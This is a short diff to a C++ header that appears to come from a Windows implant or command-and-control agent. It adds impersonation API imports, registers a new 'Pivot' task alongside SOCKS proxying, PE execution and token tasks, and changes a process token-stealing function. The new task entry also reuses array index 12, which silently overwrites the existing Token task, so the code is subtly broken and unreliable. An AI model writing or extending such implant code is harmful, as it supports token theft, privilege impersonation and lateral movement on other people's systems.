@@ -719,6 +719,10 @@ namespace Root {
 
         struct {
             UPTR Handle;
+
+            DECLAPI( ImpersonateLoggedOnUser );
+            DECLAPI( RevertToSelf );
+
             DECLAPI( LookupAccountSidW );
             DECLAPI( LookupAccountSidA );
             DECLAPI( LookupPrivilegeValueA );
@@ -734,6 +738,9 @@ namespace Root {
             DECLAPI( RegQueryValueExA );
             DECLAPI( RegCloseKey      );
         } Advapi32 = {
+            RSL_TYPE( ImpersonateLoggedOnUser ),
+            RSL_TYPE( RevertToSelf ),
+
             RSL_TYPE( LookupAccountSidW ),
             RSL_TYPE( LookupAccountSidA ),
             RSL_TYPE( LookupPrivilegeValueA ),
@@ -1887,6 +1894,10 @@ public:
         _In_ PJOBS Job
     ) -> ERROR_CODE;
 
+    auto Pivot( 
+        _In_ PJOBS Job
+    ) -> ERROR_CODE;
+
     auto Socks( 
         _In_ PJOBS Job
     ) -> ERROR_CODE;
@@ -1945,7 +1956,8 @@ public:
         Mgmt[9].ID = TskDotnet,     Mgmt[9].Run = &Task::Dotnet,
         Mgmt[10].ID = TskSocks,     Mgmt[10].Run = &Task::Socks,
         Mgmt[11].ID = TskExecPE,    Mgmt[11].Run = &Task::ExecPE,
-        Mgmt[12].ID = TskToken,     Mgmt[12].Run = &Task::Token
+        Mgmt[12].ID = TskToken,     Mgmt[12].Run = &Task::Token,
+        Mgmt[12].ID = TskPivot,     Mgmt[12].Run = &Task::Pivot
     };
 };
 
@@ -2103,7 +2115,7 @@ public:
 
     auto Steal(
         _In_ ULONG ProcessID
-    ) -> HANDLE;
+    ) -> TOKEN_NODE*;
 
     auto GetUser( 
         _In_  HANDLE TokenHandle 
